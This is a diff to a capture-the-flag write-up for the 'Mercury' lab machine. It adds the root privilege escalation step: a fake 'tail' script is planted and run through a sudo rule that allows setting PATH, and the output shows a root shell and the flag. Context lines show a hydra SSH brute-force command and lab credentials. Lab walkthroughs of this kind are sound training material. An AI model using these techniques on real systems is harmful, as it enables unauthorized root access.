@@ -106,7 +106,7 @@ root@kali: hydra -L users.txt -P passwords.txt -e nsr 192.168.56.139 ssh -t 10
 
 now we can connect to victim using `webmaster:mercuryisthesizeof0.056Earths`
 
-### 4.Privilege Escalation (To linuxmaster)
+### 4.Privilege Escalation (to linuxmaster)
 
 In home directory of user `webmaster` there is another directory called `mercury_proj` and a file `note.txt` :
 
@@ -124,7 +124,7 @@ webmaster@mercury:~$ echo 'bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==' | base64 -d
 mercurymeandiameteris4880km
 ```
 
-### 5.Privilege Escalation (To root)
+### 5.Privilege Escalation (to root)
 
 We connect to user `linuxmaster:mercurymeandiameteris4880km` :
 
@@ -146,15 +146,76 @@ User linuxmaster may run the following commands on mercury:
     (root : root) SETENV: /usr/bin/check_syslog.sh
 ```
 
+we can run the script `/usr/bin/check_syslog.sh` and at the same time set an environment variable, so let's check the content of `check_syslog.sh`
 
+```bash
+linuxmaster@mercury:/home/webmaster$ cat /usr/bin/check_syslog.sh
+#!/bin/bash
+tail -n 10 /var/log/syslog
+```
 
+this bash script is calling the `tail` command in relative form which is vulnerable to PE :
 
+```bash
+linuxmaster@mercury:~$ echo '#!/bin/bash' > tail
+linuxmaster@mercury:~$ echo '/bin/bash' >> tail
+linuxmaster@mercury:~$ chmod 777 tail
+```
 
+and run the command like this :
 
+```bash
+linuxmaster@mercury:~$ sudo PATH=$PWD /usr/bin/check_syslog.sh
+bash: groups: command not found
+Command 'lesspipe' is available in the following places
+ * /bin/lesspipe
+ * /usr/bin/lesspipe
+The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
+lesspipe: command not found
+Command 'dircolors' is available in the following places
+ * /bin/dircolors
+ * /usr/bin/dircolors
+The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
+dircolors: command not found
 
+root@mercury:/home/linuxmaster# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/usr/local/go/bin:/root/go/bin/
 
+root@mercury:/home/linuxmaster# id
+uid=0(root) gid=0(root) groups=0(root)
+```
 
+yes we are now root :
 
+```bash
+root@mercury:~# cat root_flag.txt 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
+@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
+@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
+@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
+@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
+@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
+@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
+@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
+@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
+@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
+@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
+@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
+@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
+@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
+@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
+@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
+@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+Congratulations on completing Mercury!!!
+If you have any feedback please contact me at SirFlash@protonmail.com
+[root_flag_69426d9fda579afbffd9c2d47ca31d90]
+```
+
+This is how you can get root on this machine :)
 
 
 
